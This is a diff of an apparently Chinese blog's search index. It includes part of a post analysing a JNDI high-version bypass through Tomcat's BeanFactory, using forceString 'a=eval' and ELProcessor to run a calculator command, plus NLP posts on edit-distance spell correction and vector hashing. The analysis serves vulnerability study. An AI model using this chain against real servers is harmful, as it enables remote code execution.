+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190250894.png"
+                      class="" title="image-20250314190250894"
+                > 
+
+<p>把我们的类给实例化了存在bean参数里面</p>
+<p><strong>中间有一段获取方法以及参数的过程</strong> 流程后面有写</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314190342664.png"
+                      class="" title="image-20250314190342664"
+                > 
+
+<p>反射调用命令执行。</p>
+<h2 id="JNDI绕过完整分析"><a href="#JNDI绕过完整分析" class="headerlink" title="JNDI绕过完整分析"></a>JNDI绕过完整分析</h2><p>看一下payload对应的参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173431977.png"
+                      class="" title="image-20250314173431977"
+                > 
+
+<p>可以观察到factoryLocation这个参数被设置为了null，就是为了绕过我们的JNDI的那个if判断</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314173927228.png"
+                      class="" title="image-20250314173927228"
+                > 
+<p>然后还有forceString进行构造，我们可以打上断点进行跟踪</p>
+<h3 id="漏洞触发点分析"><a href="#漏洞触发点分析" class="headerlink" title="漏洞触发点分析"></a>漏洞触发点分析</h3><p>接下来分析的是，lookup()链子走的时候是怎么绕过前面说的trustURLCodebase的限制，以及怎么触发的实例化getObjectInstance方法。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183733704.png"
+                      class="" title="image-20250314183733704"
+                > 
+
+<p>进入deocdeObject</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183818414.png"
+                      class="" title="image-20250314183818414"
+                > 
+
+<p>提前看一下被限制的地方我们打上断点</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183851246.png"
+                      class="" title="image-20250314183851246"
+                > 
+
+<p>然后我们一步一步走</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314183930238.png"
+                      class="" title="image-20250314183930238"
+                > 
+
+<p>var3是ResourceRef对象，且后续将它赋值给了var8</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184007058.png"
+                      class="" title="image-20250314184007058"
+                > 
+
+<p>然后进入判断的地方</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184020438.png"
+                      class="" title="image-20250314184020438"
+                > 
+
+<p>这里我们前面的payload设置为null的，所以可以绕过</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184052474.png"
+                      class="" title="image-20250314184052474"
+                > 
+
+<p>走到了我们实例化的地方，var3此时还是ResourceRef对象</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184424645.png"
+                      class="" title="image-20250314184424645"
+                > 
+
+<p>这里获取factoryClassName，然后进行操作</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314184537599.png"
+                      class="" title="image-20250314184537599"
+                > 
+
+<p>漏洞触发点，这里构造成了<strong>org.apache.naming.factory.BeanFactory.getObjectInstance</strong> 就是我们上面写的地方</p>
+<h3 id="org-apache-naming-factory-BeanFactory-1"><a href="#org-apache-naming-factory-BeanFactory-1" class="headerlink" title="org.apache.naming.factory.BeanFactory"></a>org.apache.naming.factory.BeanFactory</h3><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180259634.png"
+                      class="" title="image-20250314180259634"
+                > 
+
+<p>这里获取了我们要利用的类的类名</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180337115.png"
+                      class="" title="image-20250314180337115"
+                > 
+
+<p>然后将他加载</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180520260.png"
+                      class="" title="image-20250314180520260"
+                > 
+
+<p>将它实例化存储在bean里面</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314191103326.png"
+                      class="" title="image-20250314191103326"
+                > 
+
+<p>从forceString里面提取字符串a&#x3D;eval，然后提取为了param&#x3D;a，setterName&#x3D;eval</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314180633736.png"
+                      class="" title="image-20250314180633736"
+                > 
+
+<p>跟进他这里的getMethod，因为此时我们的类在变量beanClass里，eval也是提取出来在setterName，没有拼接或者组合成<strong>javax.el.ELProcessor.eval()</strong> ,这里就是获取方法的地方，就像我们之前的<strong>类.getMethod(方法名,参数类型)</strong>  </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181503362.png"
+                      class="" title="image-20250314181503362"
+                > 
+
+<p>进行一个循环，要求右边那一列不为scope、auth、singletoken、forceString</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181638180.png"
+                      class="" title="image-20250314181638180"
+                > 
+
+<p>value就是获取的参数</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314181734119.png"
+                      class="" title="image-20250314181734119"
+                > 
+
+<p>获取参数成功。</p>
+<p>这里就很眼熟了，method为方法，bean为对象，valueArray就是参数，利用反射去造成命令执行。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/03/14/JNDI%E9%AB%98%E7%89%88%E6%9C%AC%E7%BB%95%E8%BF%87/image-20250314175123674.png"
+                      class="" title="image-20250314175123674"
+                > 
+
+<p>计算器弹出成功。最后达成了类似<strong>eval.invoke(javax.el.ELProcessor,Runtime.getRuntime().exec(“open -a Calculator”))</strong></p>
+]]></content>
+      <categories>
+        <category>漏洞原理分析</category>
+      </categories>
+      <tags>
+        <tag>JNDI</tag>
       </tags>
   </entry>
   <entry>
@@ -2773,24 +2773,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2025/03/11/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
-
-<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>gophish钓鱼平台使用</title>
     <url>/2025/03/25/gophish%E9%92%93%E9%B1%BC%E5%B9%B3%E5%8F%B0%E4%BD%BF%E7%94%A8/</url>
     <content><![CDATA[<p>Gophish是为企业和渗透测试人员设计的开源网络钓鱼工具包。 它提供了快速，轻松地设置和执行网络钓鱼攻击以及安全意识培训的能力。</p>
@@ -3074,6 +3056,24 @@
       <tags>
         <tag>gophish</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2025/03/11/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a class="link"   href="https://hexo.io/" >Hexo<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>! This is your very first post. Check <a class="link"   href="https://hexo.io/docs/" >documentation<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> for more info. If you get any problems when using Hexo, you can find the answer in <a class="link"   href="https://hexo.io/docs/troubleshooting.html" >troubleshooting<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> or you can ask me on <a class="link"   href="https://github.com/hexojs/hexo/issues" >GitHub<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/writing.html" >Writing<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/server.html" >Server<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/generating.html" >Generating<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div>
+
+<p>More info: <a class="link"   href="https://hexo.io/docs/one-command-deployment.html" >Deployment<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+]]></content>
   </entry>
   <entry>
     <title>spring框架bean加载漏洞</title>
@@ -3937,5 +3937,244 @@
         <tag>泛微</tag>
         <tag>xxe</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>自动纠错</title>
+    <url>/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/</url>
+    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><strong>Happy birthday my dear friend</strong> 这是对的，但是如果我们把dear打成<strong>deah</strong> ，所以我们需要自动纠错</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230221403419.png"
+                      class="" title="image-20251230221403419"
+                > 
+
+<ul>
+<li>找到与输入字符串距离为1、2到n的距离的字符串。然后根据最小编辑距离来判断相似的字符串。然后根据上下文计算字符串出现的概率</li>
+</ul>
+<h1 id="识别错误单词"><a href="#识别错误单词" class="headerlink" title="识别错误单词"></a>识别错误单词</h1><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230221831647.png"
+                      class="" title="image-20251230221831647"
+                > 
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 定义正确的词汇集合（可根据需求扩展）</span><br><span class="line">correct_vocab = &#123;</span><br><span class="line">    &quot;数据治理&quot;, &quot;隐私安全&quot;, &quot;质量优化&quot;, &quot;全链合规&quot;,</span><br><span class="line">    &quot;大模型&quot;, &quot;多模态&quot;, &quot;差分隐私&quot;, &quot;数据溯源&quot;,</span><br><span class="line">    &quot;ACL&quot;, &quot;NeurIPS&quot;, &quot;预训练&quot;, &quot;数据筛选&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 2. 获取用户输入</span><br><span class="line">user_input = input(&quot;请输入需要检查的词汇：&quot;).strip()  # strip()去除首尾空格</span><br><span class="line"></span><br><span class="line"># 3. 判断词汇是否正确（是否在正确集合中）</span><br><span class="line">if user_input in correct_vocab:</span><br><span class="line">    print(f&quot;✅ 词汇「&#123;user_input&#125;」输入正确，无错误&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(f&quot;❌ 词汇「&#123;user_input&#125;」存在错误（未匹配到正确词汇表）&quot;)</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230222053471.png"
+                      class="" title="image-20251230222053471"
+                > 
+
+<h1 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h1><p><strong>指的是经过N个距离可以将一个词变为另一个词，即deah变为dear的编辑距离是1</strong> 。这里有多种方式</p>
+<ul>
+<li>增加词</li>
+<li>交换相邻词</li>
+<li>删减词</li>
+<li>替换词</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230222332557.png"
+                      class="" title="image-20251230222332557"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230223514144.png"
+                      class="" title="image-20251230223514144"
+                > 
+
+<p>在上面例子中先看左边，不看Edit cost。p-&gt;s:l-&gt;t 替换了两次，所以编辑了两次。但是可以设置一个操作需要花费的次数。将取代replace看成先删再加，所以他的花费是2，所以可以看成总得2*2.所以编辑距离可以当做4</p>
+<h2 id="枚举法"><a href="#枚举法" class="headerlink" title="枚举法"></a>枚举法</h2><p>遍历两个字符串然后看不同的地方替换。所以需要花费大量的时间</p>
+<h2 id="表格法"><a href="#表格法" class="headerlink" title="表格法"></a>表格法</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230224221163.png"
+                      class="" title="image-20251230224221163"
+                > 
+<p><strong>假设D(2,3)&#x3D;3,他的意思是pl变成sta的最小编辑距离是3，如果是D(4,4)&#x3D;times，意思是play变成stay的最小编辑距离是times</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230224644156.png"
+                      class="" title="image-20251230224644156"
+                > 
+
+<p>#号为空</p>
+<ul>
+<li>空变空需要0次变化</li>
+<li>p变空需要1次变化</li>
+<li>s变空需要一次变化</li>
+<li>p变s，可以看成p变空1次，空变s 1次，所以是p前面的1次再加1为2次。也可以看成是s变空再变p，也是1+1&#x3D;2次</li>
+</ul>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230225324020.png"
+                      class="" title="image-20251230225324020"
+                > 
+
+<p>横竖距离为1的加1，斜着距离加2。相同的不变</p>
+<h1 id="构建模型"><a href="#构建模型" class="headerlink" title="构建模型"></a>构建模型</h1><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230222804573.png"
+                      class="" title="image-20251230222804573"
+                > 
+
+<p>1、通过匹配词汇看是否正确拼写<br>2、找到距离为n的编辑距离的词<br>3、然后过滤候选词<br>4、计算词出现的概率，选取最大的</p>
+<h2 id="识别错误单词-1"><a href="#识别错误单词-1" class="headerlink" title="识别错误单词"></a>识别错误单词</h2><p>直接选错误单词了</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230231526877.png"
+                      class="" title="image-20251230231526877"
+                > 
+
+<h2 id="计算词编辑距离"><a href="#计算词编辑距离" class="headerlink" title="计算词编辑距离"></a>计算词编辑距离</h2><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230231603297.png"
+                      class="" title="image-20251230231603297"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230231622046.png"
+                      class="" title="image-20251230231622046"
+                > 
+
+<p>相同就不变，不相同就依据左边+1或上面+1</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%87%AA%E5%8A%A8%E7%BA%A0%E9%94%99/image-20251230231730186.png"
+                      class="" title="image-20251230231730186"
+                > 
+
+<p>然后就会获得编辑词距离列表，然后找编辑词距离最小的最优解。然后返回最优解</p>
+<h2 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">def levenshtein_distance(s1, s2):</span><br><span class="line">    &quot;&quot;&quot;计算两个字符串的编辑距离（Levenshtein距离）&quot;&quot;&quot;</span><br><span class="line">    # 创建二维矩阵，行数=len(s1)+1，列数=len(s2)+1</span><br><span class="line">    m = len(s1) + 1</span><br><span class="line">    n = len(s2) + 1</span><br><span class="line">    dp = [[0] * n for _ in range(m)]</span><br><span class="line">    </span><br><span class="line">    # 初始化边界：空字符串到目标字符串的距离（插入操作）</span><br><span class="line">    for i in range(m):</span><br><span class="line">        dp[i][0] = i</span><br><span class="line">    for j in range(n):</span><br><span class="line">        dp[0][j] = j</span><br><span class="line">    </span><br><span class="line">    # 动态规划计算编辑距离</span><br><span class="line">    for i in range(1, m):</span><br><span class="line">        for j in range(1, n):</span><br><span class="line">            # 字符相同则无需操作，否则取替换/插入/删除的最小代价+1</span><br><span class="line">            cost = 0 if s1[i-1] == s2[j-1] else 1</span><br><span class="line">            dp[i][j] = min(</span><br><span class="line">                dp[i-1][j] + 1,    # 删除操作</span><br><span class="line">                dp[i][j-1] + 1,    # 插入操作</span><br><span class="line">                dp[i-1][j-1] + cost  # 替换操作</span><br><span class="line">            )</span><br><span class="line">    return dp[m-1][n-1]</span><br><span class="line"></span><br><span class="line">def spell_corrector(input_word, vocab, max_dist=2):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    基于编辑距离的简单纠错函数（拆分推导式，逻辑更清晰）</span><br><span class="line">    :param input_word: 输入的可能错误词汇</span><br><span class="line">    :param vocab: 正确词汇库</span><br><span class="line">    :param max_dist: 最大编辑距离（超过则不推荐）</span><br><span class="line">    :return: 纠错建议（最优匹配+所有候选）</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    # 第一步：初始化空字典，存储词汇-编辑距离映射</span><br><span class="line">    dist_dict = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    # 第二步：循环计算输入词与词汇库中每个词的编辑距离</span><br><span class="line">    for word in vocab:</span><br><span class="line">        distance = levenshtein_distance(input_word, word)</span><br><span class="line">        dist_dict[word] = distance  # 将结果存入字典</span><br><span class="line">    </span><br><span class="line">    # 第三步：拆分字典推导式 → 逐行判断+添加（核心修改部分）</span><br><span class="line">    candidates = &#123;&#125;  # 初始化候选词字典</span><br><span class="line">    # 遍历所有词汇和对应的编辑距离</span><br><span class="line">    for word, dist in dist_dict.items():</span><br><span class="line">        # 单独写条件判断，不嵌入推导式</span><br><span class="line">        if dist &lt;= max_dist:</span><br><span class="line">            # 满足条件才加入候选字典</span><br><span class="line">            candidates[word] = dist</span><br><span class="line">    </span><br><span class="line">    # 第四步：判断是否有候选词，生成返回结果</span><br><span class="line">    result = &#123;</span><br><span class="line">        &quot;输入词汇&quot;: input_word,</span><br><span class="line">        &quot;最优建议&quot;: None,</span><br><span class="line">        &quot;候选列表&quot;: []</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    # 有候选词时，找最优建议并排序候选列表</span><br><span class="line">    if candidates:</span><br><span class="line">        # 找编辑距离最小的最优建议</span><br><span class="line">        best_word = None</span><br><span class="line">        min_dist = float(&#x27;inf&#x27;)  # 初始化为无穷大</span><br><span class="line">        for word, dist in candidates.items():</span><br><span class="line">            if dist &lt; min_dist:</span><br><span class="line">                min_dist = dist</span><br><span class="line">                best_word = word</span><br><span class="line">        result[&quot;最优建议&quot;] = best_word</span><br><span class="line">        </span><br><span class="line">        # 候选列表按编辑距离升序排列（拆分sorted推导式）</span><br><span class="line">        sorted_candidates = []</span><br><span class="line">        # 先把候选字典转成列表（[(词汇, 距离), ...]）</span><br><span class="line">        candidate_list = list(candidates.items())</span><br><span class="line">        # 自定义排序：按距离从小到大</span><br><span class="line">        for item in sorted(candidate_list, key=lambda x: x[1]):</span><br><span class="line">            sorted_candidates.append(item)</span><br><span class="line">        result[&quot;候选列表&quot;] = sorted_candidates</span><br><span class="line">    </span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"># ------------------- 示例运行 -------------------</span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # 1. 定义正确词汇库（数据治理领域示例）</span><br><span class="line">    correct_vocab = &#123;</span><br><span class="line">        &quot;数据治理&quot;, &quot;隐私安全&quot;, &quot;质量优化&quot;, &quot;全链合规&quot;,</span><br><span class="line">        &quot;大模型&quot;, &quot;多模态&quot;, &quot;差分隐私&quot;, &quot;数据筛选&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # 2. 测试错误词汇纠错</span><br><span class="line">    test_cases = [&quot;数椐治理&quot;, &quot;隐私安泉&quot;, &quot;全链和规&quot;]</span><br><span class="line">    </span><br><span class="line">    print(&quot;===== 编辑距离纠错示例 =====&quot;)</span><br><span class="line">    for wrong_word in test_cases:</span><br><span class="line">        result = spell_corrector(wrong_word, correct_vocab)</span><br><span class="line">        print(f&quot;\n输入错误词汇：&#123;wrong_word&#125;&quot;)</span><br><span class="line">        if result[&quot;最优建议&quot;]:</span><br><span class="line">            print(f&quot;最优纠错建议：&#123;result[&#x27;最优建议&#x27;]&#125;&quot;)</span><br><span class="line">            print(f&quot;候选匹配（词汇:编辑距离）：&#123;result[&#x27;候选列表&#x27;]&#125;&quot;)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;无匹配的纠错建议（编辑距离超过阈值）&quot;)</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <tags>
+        <tag>自动纠错</tag>
+        <tag>编辑距离最小值</tag>
+        <tag>动态规划</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>词向量局部哈希</title>
+    <url>/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/</url>
+    <content><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230191806548.png"
+                      class="" title="image-20251230191806548"
+                > 
+
+<p>在翻译词或者文档的时候，需要将一个词或者文档的向量经过一定的变换转换成别的语言的向量。</p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230191849308.png"
+                      class="" title="image-20251230191849308"
+                > 
+
+<p>如X就是英语，经过R矩阵的变换变成Y法语</p>
+<h1 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h1><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230192055210.png"
+                      class="" title="image-20251230192055210"
+                > 
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230191955642.png"
+                      class="" title="image-20251230191955642"
+                > 
+
+<p><strong>将R看成变量，别的都看成常数求导，然后X因为是矩阵不一定是方阵，所以需要转置一下再乘</strong> </p>
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230192628408.png"
+                      class="" title="image-20251230192628408"
+                > 
+
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line"></span><br><span class="line">A = np.array([[2,2],</span><br><span class="line">              [2,2]])</span><br><span class="line">A_square = np.square(A)</span><br><span class="line">A_Frobenious = np.sqrt(np.sum(A_square))</span><br><span class="line">print(A_Frobenious)</span><br></pre></td></tr></table></figure></div>
+
+<img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/30/%E8%AF%8D%E5%90%91%E9%87%8F%E5%B1%80%E9%83%A8%E5%93%88%E5%B8%8C/image-20251230192434904.png"
+                      class="" title="image-20251230192434904"
+                >
+
+<h1 id="局部哈希"><a href="#局部哈希" class="headerlink" title="局部哈希"></a>局部哈希</h1><img  
+                     lazyload
